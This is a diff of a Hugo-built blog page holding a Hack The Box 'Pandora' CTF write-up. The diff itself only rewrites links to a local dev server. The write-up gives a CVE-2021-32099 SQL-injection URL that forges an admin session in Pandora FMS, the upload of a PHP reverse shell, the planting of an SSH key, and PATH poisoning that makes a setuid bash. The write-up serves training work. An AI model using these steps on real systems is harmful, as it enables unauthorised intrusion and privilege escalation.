@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
 
   <meta charset="utf-8" />
 
@@ -36,7 +36,7 @@
     <meta name="twitter:title" content="Pandora Hackthebox writeup">
     <meta name="twitter:description" content="In This Box we are going to enumerate the snmp port which will show user daniel with his password as a string in the output , we are going to login with ssh to him and will see there is another user matt which has the user.txt , after some enumeration we will see there is pandora fms running internally with user matt , we will port forward to exploit the vulnerable service then we will abuse a path poisoning in a custom binary for the root access
 ">
-    <meta name="twitter:image" content="/media/pandora/20220120210059.png">
+    <meta name="twitter:image" content="//localhost:1313/media/pandora/20220120210059.png">
   
 
   
@@ -44,8 +44,8 @@
   <meta property="og:title" content="Pandora Hackthebox writeup">
   <meta property="og:description" content="In This Box we are going to enumerate the snmp port which will show user daniel with his password as a string in the output , we are going to login with ssh to him and will see there is another user matt which has the user.txt , after some enumeration we will see there is pandora fms running internally with user matt , we will port forward to exploit the vulnerable service then we will abuse a path poisoning in a custom binary for the root access
 ">
-  <meta property="og:url" content="/post/pandora/">
-  <meta property="og:image" content="/media/pandora/20220120210059.png">
+  <meta property="og:url" content="//localhost:1313/post/pandora/">
+  <meta property="og:image" content="//localhost:1313/media/pandora/20220120210059.png">
 
 
 
@@ -53,7 +53,7 @@
 <meta name="generator" content="Hugo 0.86.1">
 
 
-<link rel="canonical" href="/post/pandora/">
+<link rel="canonical" href="//localhost:1313/post/pandora/">
 
 <meta name="renderer" content="webkit">
 <meta name="viewport" content="width=device-width,initial-scale=1">
@@ -78,20 +78,20 @@
 <meta name='msapplication-navbutton-color' content="#02b875">
 <meta name="msapplication-TileColor" content="#02b875">
 <meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
-<link rel="icon" href="/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
-<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
-<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
-<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="//localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="//localhost:1313/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="//localhost:1313/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="//localhost:1313/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="//localhost:1313/icons/icon-152x152.png">
+<link rel="manifest" href="//localhost:1313/manifest.json">
 
 
-<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+<link rel="preload" href="//localhost:1313/styles/main-rendered.min.css" as="style">
 
 
 <link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
-<link rel="preload" href="/images/avatar.gif" as="image">
-<link rel="preload" href="/images/test.jpg" as="image">
+<link rel="preload" href="//localhost:1313/images/avatar.gif" as="image">
+<link rel="preload" href="//localhost:1313/images/test.jpg" as="image">
 
 
 <style>
@@ -99,7 +99,7 @@
     background: rgb(244, 243, 241) url('/images/test.jpg') repeat fixed;
   }
 </style>
-<link rel="stylesheet" href="/styles/main-rendered.min.css">
+<link rel="stylesheet" href="//localhost:1313/styles/main-rendered.min.css">
 
 
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
@@ -139,9 +139,9 @@
     
     
   <header class="site-header">
-  <a href=""><img class="avatar" src="/images/avatar.gif" alt="Avatar"></a>
+  <a href="//localhost:1313/"><img class="avatar" src="//localhost:1313/images/avatar.gif" alt="Avatar"></a>
   
-  <h2 class="title"><a href="">0xMesbaha</a></h2>
+  <h2 class="title"><a href="//localhost:1313/">0xMesbaha</a></h2>
   
   <p class="subtitle" style="color:#00ab6b">&gt; Hello Friend </p>
   <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
@@ -159,21 +159,21 @@
           
           
           ">
-          <a href="/">Posts</a>
+          <a href="//localhost:1313/">Posts</a>
         </li>
       
         <li class="menu-item
           
           
           ">
-          <a href="/tags/">Tags</a>
+          <a href="//localhost:1313/tags/">Tags</a>
         </li>
       
         <li class="menu-item
           
           
           ">
-          <a href="/about/">About</a>
+          <a href="//localhost:1313/about/">About</a>
         </li>
       
     </ul>
@@ -229,7 +229,7 @@ PORT      STATE    SERVICE VERSION
 <ul>
 <li>port 80 : the web page :</li>
 </ul>
-<p><img src="/media/pandora/20220120195335.png" alt="error"></p>
+<p><img src="//localhost:1313/media/pandora/20220120195335.png" alt="error"></p>
 <p>there is only this form where we can send data , parameters are :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">fullName=ADam&amp;email=adma@testet.com&amp;phone=a&amp;message=a
 </code></pre></div><p>testing them for sqli , ssti and more found out this is just a rabbit Hole :'')</p>
@@ -244,31 +244,31 @@ PORT      STATE    SERVICE VERSION
 </code></pre></div><h1 id="foothold-">Foothold :</h1>
 <p>i have logged in with <code>daniel</code> However user <code>matt</code> is the one contains the <code>user.txt</code> and he only can read it</p>
 <p>we need to escalate to <code>matt</code> then <code>root</code></p>
-<p><img src="/media/pandora/20220521124027.png" alt="error"></p>
+<p><img src="//localhost:1313/media/pandora/20220521124027.png" alt="error"></p>
 <p>after a lot of enumeration we will see  :</p>
-<p><img src="/media/pandora/20220521124108.png" alt="error"></p>
+<p><img src="//localhost:1313/media/pandora/20220521124108.png" alt="error"></p>
 <p>the web page we have seen above is for the <code>html</code> But what about <code>pandora</code> ?</p>
-<p><img src="/media/pandora/20220521112241.png" alt="error"></p>
+<p><img src="//localhost:1313/media/pandora/20220521112241.png" alt="error"></p>
 <p>and we will see it is owned by the user <code>matt</code> which we are targeting.</p>
-<p><img src="/media/pandora/20220521123919.png" alt="error"></p>
+<p><img src="//localhost:1313/media/pandora/20220521123919.png" alt="error"></p>
 <p>so it seems we need to do <strong>Port forwarding</strong> to interact with this page at the Browser.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># @ your side</span>
 sudo ssh -N -L 0.0.0.0:9999:127.0.0.1:80 daniel@10.10.11.136
 </code></pre></div><p>that will let us see this web page at <code>http://127.0.0.1:9999</code></p>
-<p><img src="/media/pandora/20220120200414.png" alt="error"></p>
+<p><img src="//localhost:1313/media/pandora/20220120200414.png" alt="error"></p>
 <p>and we can see the version at the bottom of the page : <strong><code>v7.0NG.742_FIX_PERL2020</code></strong></p>
 <p>searching for Vulnerabilities for this version will find  <strong><code>CVE-2021-32099</code></strong>  which is SQL injection in the session_id , and the payload is <a href="https://github.com/ibnuuby/CVE-2021-32099">here</a>  and it is explained in the blog <a href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained">here</a></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">http://127.0.0.1:9999/pandora_console/include/chart_generator.php?session_id<span style="color:#f92672">=</span>a<span style="color:#e6db74">&#39; UNION SELECT &#39;</span>a<span style="color:#e6db74">&#39;,1,&#39;</span>id_usuario|s:5:<span style="color:#e6db74">&#34;admin&#34;</span>;<span style="color:#e6db74">&#39; as data FROM tsessions_php WHERE &#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
 </code></pre></div><p>all we need to do is to go back to <strong><code>http://127.0.0.1:9999/pandora_console/</code></strong>
 and we will have admin access as the admin cookie has been added</p>
-<p><img src="/media/pandora/20220120200737.png" alt="error"></p>
+<p><img src="//localhost:1313/media/pandora/20220120200737.png" alt="error"></p>
 <p>Hence the site works with <strong>PHP</strong> we can know that from <strong>wappalayzer</strong> extension, so we need to upload a php reverse shell .</p>
 <p>It is located at <code>/usr/share/webshells/php/php-reverse-shell.php</code> in Linux or you can download it <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">here</a> By watching <a href="https://www.youtube.com/watch?v=KX_jZsdgsJE&amp;ab_channel=k4m1ll0-hackingchannel">here</a> we need to zip it then we can execute it at <strong><code>/pandora_console/extensions/shell.php</code></strong></p>
 <p>upload it at</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">admin tools &gt; extensions manager &gt; extension uploader
 </code></pre></div><p>Then set your listener and will get the shell after execute it at
 <code>/pandora_console/extensions/shell.php</code></p>
-<p><img src="/media/pandora/20220120204254.png" alt="error"></p>
+<p><img src="//localhost:1313/media/pandora/20220120204254.png" alt="error"></p>
 <p>Once we are in we can generate ssh keys to get a stable shell</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~$ ssh-keygen -f pandora 
 </code></pre></div><ul>
@@ -278,10 +278,10 @@ and we will have admin access as the admin cookie has been added</p>
 </code></pre></div><p>But hence we don&rsquo;t know matt&rsquo;s password , we would copy our key manually and add it to <code>authorized_keys</code> at matt&rsquo;s side</p>
 <p>now copy <code>pandora.pub</code> into <code>authorized_keys</code> at the target machine ,  you can connect now:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~$  ssh matt@10.10.11.136 -i pandora
-</code></pre></div><p><img src="/media/pandora/20220521120958.png" alt="error"></p>
+</code></pre></div><p><img src="//localhost:1313/media/pandora/20220521120958.png" alt="error"></p>
 <h1 id="privilege-escalation">Privilege escalation</h1>
 <p>Searching for SUID binaries found :</p>
-<p><img src="/media/pandora/20220521121149.png" alt="error"></p>
+<p><img src="//localhost:1313/media/pandora/20220521121149.png" alt="error"></p>
 <p>The <code>/usr/bin/pandora_backup</code> seems odd , we can explore it with <strong>strings</strong> but it is not installed on the box , we can move it to our side and explore it or Just try <code>strace</code> first</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strace /usr/bin/pandora_backup
 </code></pre></div><p>we can see in the output :</p>
@@ -290,19 +290,19 @@ and we will have admin access as the admin cookie has been added</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;cp /bin/bash /tmp/bash ; chmod +s /tmp/bash&#34;</span> &gt; tar
 chmod <span style="color:#ae81ff">777</span> tar
 export PATH<span style="color:#f92672">=</span>.:$PATH
-</code></pre></div><p><img src="/media/pandora/20220521121710.png" alt="error"></p>
+</code></pre></div><p><img src="//localhost:1313/media/pandora/20220521121710.png" alt="error"></p>
 <h3 id="pwned">pwned</h3></article>
     <footer class="post-footer">
       
       <ul class="post-tags">
         
-          <li><a href="/tags/hackthebox"><span class="tag">Hackthebox</span></a></li>
+          <li><a href="//localhost:1313/tags/hackthebox"><span class="tag">Hackthebox</span></a></li>
         
-          <li><a href="/tags/snmp"><span class="tag">Snmp</span></a></li>
+          <li><a href="//localhost:1313/tags/snmp"><span class="tag">Snmp</span></a></li>
         
-          <li><a href="/tags/port-forwarding"><span class="tag">Port-Forwarding</span></a></li>
+          <li><a href="//localhost:1313/tags/port-forwarding"><span class="tag">Port-Forwarding</span></a></li>
         
-          <li><a href="/tags/path-poisoning"><span class="tag">Path-Poisoning</span></a></li>
+          <li><a href="//localhost:1313/tags/path-poisoning"><span class="tag">Path-Poisoning</span></a></li>
         
       </ul>
       
@@ -356,7 +356,7 @@ export PATH<span style="color:#f92672">=</span>.:$PATH
 
 
 
-<script src="/scripts/index.min.js"></script>
+<script src="//localhost:1313/scripts/index.min.js"></script>
 
 <script>
   if ('serviceWorker' in navigator) {
